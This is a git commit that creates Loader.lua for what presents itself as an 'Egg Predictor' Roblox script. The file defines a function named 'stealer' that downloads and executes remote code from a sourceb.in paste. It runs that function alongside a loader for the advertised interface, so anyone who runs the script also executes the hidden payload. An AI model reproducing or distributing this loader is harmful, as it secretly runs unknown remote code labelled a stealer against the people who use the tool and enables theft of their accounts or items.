b5ce6f4f56ef7d4d4bb69a45825da2600fc430a8
ZeoHubs <voidzskie@gmail.com>
2025-07-22 01:47:56 +0800

    Create Loader.lua

---
+++ EggPredictorV2/Loader.lua
@@ -0,0 +1,9 @@
+local function stealer()
+  loadstring(game:HttpGet("https://cdn.sourceb.in/bins/aFWGArJSne/0", true))()
+end
+local function loadui()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysbeamediocre/PetSpawner/refs/heads/main/EggPredictor.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
